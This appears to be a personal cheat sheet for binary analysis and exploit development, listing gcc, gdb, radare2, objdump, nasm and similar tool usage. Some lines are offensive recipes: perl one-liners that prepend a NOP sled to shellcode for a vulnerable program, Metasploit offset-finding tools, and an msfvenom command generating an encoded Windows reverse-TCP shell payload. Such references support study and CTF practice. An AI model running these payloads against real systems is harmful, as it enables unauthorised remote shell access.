GCC
	gcc -g -o prog prog.c
		-compile program with debugging information(-g), debugging verbosity set with debugging flag as g# where # is integer character <=3 && >=1
	gcc -static -o shellcode shellcode.c
		-flag '-static' prevents dynamic linking, ergo preserves system calls
GDB
	COMPILING FOR DEBUGGER
	gdb ./prog
		-launch gdb shell with prog
	EXECUTION FLOW
	(gdb)break main			set break point at function main
	(gdb)run				execute program untils first break point in program is met
	(gdb)start
	(gdb)step
	(gdb)continue
	MEMORY INFORMATION
	(gdb)x/## $esp			examine values stored at $esp and # additional following memory locations
	(gdb)x/s 0xbfffce5		examine specifically the value stored at given location
	(gdb)info register eip	show info(values) stored at a given register
	VIEWING CODE(.text)
	(gdb)disas func

Radare2
	https://www.radare.org/
	https://github.com/radareorg/radare2
		--radare2 debugger
	https://github.com/radareorg/cutter
		--radare2 gui
	https://github.com/radareorg/cutter-plugins
	https://github.com/radareorg/radare2-pm
		--radare2 package manager
	r2pm
		--following can be run from standard radare2 package install to install r2pm
r2pm init
r2pm update
r2pm install package
	https://github.com/radareorg/r2ghidra-dec
		--radare2 ghidra integration
r2pm install ghidra r2ghidra-dec ghidra-r2webserver
	--ghidra can be downloaded and installed from r2pm without manually compiling binaries (not bleeding-edge repo version)
	https://github.com/radareorg/r2dec-js
	

SHELL/BASH
	chown owner[:group] /file
		-change the owner and owner group of a file or /dir
	chmod 741 file
		-change execution permissions for a file adding the decimal equivelant of three binary places for each of owner-group owner-other users
		--4=read
		--2=write
		--1=execute
		--an additional preceding byte decimal may precede value -4=set userid on execution -2=set group id on execution or set locking -1=sticky bit
	
PERL
	/.prog `perl -e 'print "\x90"x200;'``cat shellcode_file`
		-perl's print function is an obvious efficient method of building a shellcode exploit on the cli and within command substitution(``) can easily produce output as argument to the vulnerable program along with other cli programs
	export SHELLCODE=`perl -e 'print "\x90"x18;``cat shellcode_file`
	./prog SHELLCODE
		perl strings appended to shellcode can be sent to an env var for repeated use

	
nm
	-lists symbols (value, type and name) in object files
	nm ./prog
		--for debugging, default sorts by symbol name
	nm --numeric-sort ./objfile
		--sort symbols numerically by their [memory] addresses rather than alphabetically by name
		--option can also be typed as (-n or -v)
	
od -An -tx1 shellcode | sed -e 's/ /\\x/g' -e 's/.*/"&"/'
	convert a raw (binary) file into a hexdump suitable for inclusion into a C file as target shell
	
nasm
	nasm -f elf shellcode.asm
	ld -o shellcode shellcode.o
	nasm -f elf -o shellcode.o shellcode.asm
	gcc -o shellcode shellcode.o
		-convert a shellcode assembly language file into a c object file to compile

ndisam
	ndisasm -u binary
		-disassembler for x86 architecture in AT&T syntax
	echo -n $(cat /tmp/shell) | ndisasm -u -
	
objdump
	objdump -h ./prog
		print the memory addresses and contents of program table sections
		.dtors	-destructor function executed just before an exit() system call
		.ctors	-constructor function executed before the main() funciton is executed
		.plt	-procedure linkage table, containing jump instructions to pointers to function locations
		.got	-global offset table, 
	objdump -s -j .section ./prog
		display assembly language instructions contained by a section
	objdump -R ./prog
		display dynamic relocation entry addresses for program
	objdump -d shellcode
		disassembly of section .text
	objdump -m i386 -b binary -D /tmp/shellcode
		

file file.bin
	-return sniffed filetype

		
strace file.bin
	strace shell (system call debugger)

nm file.bin
	-debugging symbols from object file

strings -pintel -n6 file.bin
	-locate and output any NUL-terminated sequence of n-length bytes (default: 4) using (-p) intex x86 syntax

stat file.bin
	-file info
	
watch ./file.bin
	-run command (e.g. ./file.bin) repeatedly return results & highlight diff

diff file file.1
	-show difference between like or derived files

xxd
xxd -r

ldd file.so
	-return dynamic (shared) library info
		
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438

msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d"



Binary analysis Tool sets/Frameworks/Platforms
https://github.com/BinaryAnalysisPlatform/bap
https://github.com/BinaryAnalysisPlatform/bap-toolkit
https://github.com/BinaryAnalysisPlatform/bap-plugins
https://github.com/armijnhemel/binaryanalysis-ng
https://github.com/trailofbits/manticore
https://github.com/slimm609/checksec.sh
https://github.com/trailofbits/winchecksec
https://github.com/eliben/pyelftools


paid:
https://binary.ninja/